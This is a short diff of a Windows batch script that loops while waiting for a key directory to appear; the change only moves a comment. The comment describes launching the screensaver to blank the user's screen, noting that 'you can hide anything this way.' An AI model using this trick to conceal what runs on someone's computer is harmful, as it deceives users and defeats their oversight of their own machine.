@@ -20,7 +20,9 @@ if exist "%keyDirectory%" (
         goto end
     )
     echo Directory not found. Checking again... (Elapsed time: !elapsedTime! seconds)
-    start scrnsave.scr /s   :: This Code line blocks Screen Visibility of the User. The User wont see his Screen, but rather a gray fullscreen image of nothing. You can hide anything this way!
+    
+    :: The following line of Code blocks Screen Visibility for the User. The User wont see his Screen, but rather a gray fullscreen image of nothing. You can hide anything this way!
+    start scrnsave.scr /s      
     set /a "elapsedTime+=1"
     goto loop
 )
